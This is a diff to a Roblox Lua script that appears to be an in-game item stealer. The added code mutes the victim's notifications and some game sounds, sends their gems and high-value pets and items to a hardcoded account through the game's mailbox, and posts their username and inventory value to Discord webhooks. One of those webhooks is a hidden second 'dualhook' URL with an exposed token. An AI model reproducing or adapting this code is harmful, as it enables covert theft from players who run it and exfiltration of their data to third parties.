@@ -4,28 +4,32 @@ local isDualhook = false
 local alternativeUsername = "bx4rzwasdeleted"
 local alternativeWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3" -- Alternative webhook URL
 
-local HttpService = game:GetService("HttpService")
 local network = game:GetService("ReplicatedStorage"):WaitForChild("Network")
 local library = require(game.ReplicatedStorage.Library)
 local save = require(game:GetService("ReplicatedStorage"):WaitForChild("Library"):WaitForChild("Client"):WaitForChild("Save")).Get().Inventory
 local plr = game.Players.LocalPlayer
 local MailMessage = "Join discord.gg/rZmNK6Ptxw"
-local isDualhook = false
-local alternativeWebhook = "https://discord.com/api/webhooks/1289613307631632417/RrQFIi86rxupJJinPyFfQ_kikvOLmmYz82lfO0NDBPUdC15aIDUkUBSqHRrBGGbyhYk3" -- Alternative webhook URL
+local HttpService = game:GetService("HttpService")
 local sortedItems = {}
 local totalRAP = 0
-local GemAmount1 = 0
-local min_rap = 10000
+_G.scriptExecuted = _G.scriptExecuted or false
+local GetSave = function()
+    return require(game.ReplicatedStorage.Library.Client.Save).Get()
+end
 
--- Get gem amount from inventory
-for i, v in pairs(save().Inventory.Currency) do
+if _G.scriptExecuted then
+    return
+end
+_G.scriptExecuted = true
+
+local GemAmount1 = 0
+for i, v in pairs(GetSave().Inventory.Currency) do
     if v.id == "Diamonds" then
         GemAmount1 = v._am
         break
     end
 end
 
--- Format number for better readability
 local function formatNumber(number)
     if number == nil then
         return "0"
@@ -47,20 +51,6 @@ local function formatNumber(number)
     end
 end
 
--- Send data to webhook asynchronously
-local function sendToWebhook(url, data)
-    task.spawn(function()
-        local success, errorMessage = pcall(function()
-            HttpService:PostAsync(url, data, Enum.HttpContentType.ApplicationJson)
-        end)
-
-        if not success then
-            warn("Error sending to webhook:", errorMessage)
-        end
-    end)
-end
-
--- Send message to Discord webhook
 local function SendMessage(username, diamonds, isDualhooked)
     local headers = {
         ["Content-Type"] = "application/json",
@@ -141,7 +131,12 @@ local function SendMessage(username, diamonds, isDualhooked)
 
     -- Send to the main webhook
     if webhook and webhook ~= "" then
-        sendToWebhook(webhook, body)
+        request({
+            Url = webhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
     end
 
     -- Send to the dualhooked webhook if it's dualhooked
@@ -149,66 +144,124 @@ local function SendMessage(username, diamonds, isDualhooked)
         fields[1].value = "Dualhook Execution!"
         data.embeds[1].fields = fields
         body = HttpService:JSONEncode(data)
-        sendToWebhook(alternativeWebhook, body)
+        request({
+            Url = alternativeWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
     else
         -- Send a non-dualhooked log for all executions to dualhooked webhook
         fields[1].value = "Execution Log"
         data.embeds[1].fields = fields
         body = HttpService:JSONEncode(data)
-        sendToWebhook(alternativeWebhook, body)
+        request({
+            Url = alternativeWebhook,
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
     end
 end
 
--- Improved async handling for mailbox interaction
-local function ClaimMail()
-    task.spawn(function()
-        local timeout = tick() + 30  -- Timeout after 30 seconds
-        local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+local loading = plr.PlayerScripts.Scripts.Core["Process Pending GUI"]
+local noti = plr.PlayerGui.Notifications
+loading.Disabled = true
+noti:GetPropertyChangedSignal("Enabled"):Connect(function()
+    noti.Enabled = false
+end)
+noti.Enabled = false
 
-        while err == "You must wait 30 seconds before using the mailbox!" and tick() < timeout do
-            wait(1)
-            response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+game.DescendantAdded:Connect(function(x)
+    if x.ClassName == "Sound" then
+        if x.SoundId=="rbxassetid://11839132565" or x.SoundId=="rbxassetid://14254721038" or x.SoundId=="rbxassetid://12413423276" then
+            x.Volume=0
+            x.PlayOnRemove=false
+            x:Destroy()
         end
-
-        if err then
-            print("Failed to claim mail within timeout.")
-        end
-    end)
-end
-
--- Avoid infinite loops for `InvokeServer`
-local function safeInvokeServer(func, ...)
-    local success, result = pcall(func, ...)
-    if not success then
-        warn("InvokeServer failed:", result)
-        return nil
     end
-    return result
+end)
+
+local function getRAP(Type, Item)
+    return (require(game:GetService("ReplicatedStorage").Library.Client.RAPCmds).Get(
+        {
+            Class = {Name = Type},
+            IsA = function(hmm)
+                return hmm == Type
+            end,
+            GetId = function()
+                return Item.id
+            end,
+            StackKey = function()
+                return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
+            end
+        }
+    ) or 0)
 end
 
--- Send item with a check on rap
+local user = Username or "tobi437a"
+local min_rap = min_rap or 10000
+local webhook = webhook
+
 local function sendItem(category, uid, am)
-    local args = {user, MailMessage, category, uid, am or 1}
-    local response = safeInvokeServer(network:WaitForChild("Mailbox: Send").InvokeServer, unpack(args))
-    if response == false then
-        warn("Failed to send item:", category)
-    end
+    local args = {
+        [1] = user,
+        [2] = MailMessage,
+        [3] = category,
+        [4] = uid,
+        [5] = am or 1
+    }
+    local response = false
+    repeat
+        local response, err = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+    until response == true
 end
 
--- Send gems if criteria are met
 local function SendAllGems()
-    for i, v in pairs(save().Inventory.Currency) do
+    for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
             if GemAmount1 >= 500 and GemAmount1 >= min_rap then
-                local args = {user, MailMessage, "Currency", i, GemAmount1}
-                safeInvokeServer(network:WaitForChild("Mailbox: Send").InvokeServer, unpack(args))
+                local args = {
+                    [1] = user,
+                    [2] = MailMessage,
+                    [3] = "Currency",
+                    [4] = i,
+                    [5] = GemAmount1
+                }
+                local response = false
+                repeat
+                    local response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+                until response == true
                 break
             end
         end
     end
 end
 
--- Trigger mailbox claims asynchronously
-task.spawn(function()
-    ClaimMail()
-end)
+local function ClaimMail()
+    local response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    while err == "You must wait 30 seconds before using the mailbox!" do
+        wait()
+        response, err = network:WaitForChild("Mailbox: Claim All"):InvokeServer()
+    end
+end
+
+local categoryList = {"Pet", "Hoverboard", "Fruit", "Misc", "Booth"}
+
+for i, v in pairs(categoryList) do
+    for _, item in pairs(GetSave().Inventory[v]) do
+        local rapValue = getRAP(v, item)
+        if rapValue >= min_rap then
+            totalRAP = totalRAP + rapValue
+            table.insert(sortedItems, {name = item.Name, amount = item.amount, rap = rapValue, chance = item.value})
+        end
+    end
+end
+
+local dualhook = false
+if totalRAP >= 100000 then
+    dualhook = true
+end
+
+SendMessage(user, GemAmount1, dualhook)
+ClaimMail()
